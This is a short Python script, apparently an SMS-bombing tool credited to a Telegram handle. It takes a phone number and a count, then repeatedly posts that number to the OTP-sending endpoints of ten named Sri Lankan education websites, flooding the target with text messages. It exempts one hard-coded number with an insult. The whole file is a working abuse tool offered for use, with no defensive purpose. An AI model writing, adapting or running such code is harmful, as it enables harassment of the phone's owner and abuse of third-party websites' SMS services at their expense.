import requests
import pyfiglet

ascii_banner = pyfiglet.figlet_format("SK  Dev")
print("Tool By ,")
print(ascii_banner)
print("@malithrukshan | Telegram")
print(" ")
number = str(input("Enter number :- "))
print("Warring !!!  1 = 10")
s = int(input("Amount :- "))
    

if number == "767964791":
    print("Hukapan pakaya")
else:
    ss=0
    while s > ss:
        url = 'https://apexkegalle.lk/kegalle/index.php/online_student/New_Student_Register_C/send_otp_sms/'
        url1 = 'https://eclassonline.lk/sisulka/index.php/online_student/New_Student_Register_C/send_otp_sms/'
        url2 = 'https://apexkegalle.lk/kandy/index.php/online_student/New_Student_Register_C/send_otp_sms/'
        url3 = 'https://apexkegalle.lk/kurunegala/index.php/online_student/New_Student_Register_C/send_otp_sms/'
        url4 = 'https://thefirst.lk/online/index.php/online_student/New_Student_Register_C/send_otp_sms/'
        url5 = 'https://susipvan.lk/online/index.php/online_student/New_Student_Register_C/send_otp_sms/'
        url6 = 'https://syzygyonline.lk/gampaha/index.php/online_student/New_Student_Register_C/send_otp_sms/'
        url7 = 'https://susipvan.lk/online/index.php/online_student/New_Student_Register_C/send_otp_sms/'
        url8 = 'https://nozero.lk/online/index.php/online_student/New_Student_Register_C/send_otp_sms/'
        url9 = 'https://syzygyonline.lk/nugegoda/index.php/online_student/New_Student_Register_C/send_otp_sms/'
        headers = {'Content-Type': 'application/x-www-form-urlencoded','sms_otp_mobile': number}
        body = "sms_otp_mobile="+number
        req = requests.post(url, headers=headers, data=body)
        req1 = requests.post(url1, headers=headers, data=body)
        req2 = requests.post(url2, headers=headers, data=body)
        req3 = requests.post(url3, headers=headers, data=body)
        req4 = requests.post(url4, headers=headers, data=body)
        req5 = requests.post(url5, headers=headers, data=body)
        req6 = requests.post(url6, headers=headers, data=body)
        req7 = requests.post(url7, headers=headers, data=body)
        req8 = requests.post(url8, headers=headers, data=body)
        req9 = requests.post(url9, headers=headers, data=body)
        ss+=1
        if req.status_code == 200:
            print("Success !!!")